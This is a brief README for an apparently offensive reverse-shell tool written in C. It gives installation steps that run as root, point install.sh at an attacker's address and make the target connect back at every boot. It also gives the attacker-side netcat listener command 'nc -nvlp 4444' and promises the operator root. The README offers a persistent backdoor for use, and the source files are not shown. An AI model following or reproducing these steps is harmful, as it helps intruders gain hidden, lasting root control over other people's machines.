# reverse-shell
## DO NOT RUN THIS ON YOUR OWN COMPUTER UNLESS YOU WANT TO BE PWNED
A reverse shell written in c

## Installation and activation
* This must be done as the root user
* Install gcc and git if not already done
* Clone repository and add execute on install.sh
* Modify the address in install.sh to be the address of the attacker
* If needed, modify the port number in shell.c
* Run install.sh

## On the attacking box
* $nc -nvlp 4444
* When target box reboots or powers on, it will establish connection
* Wait for connection to pop
* Have root

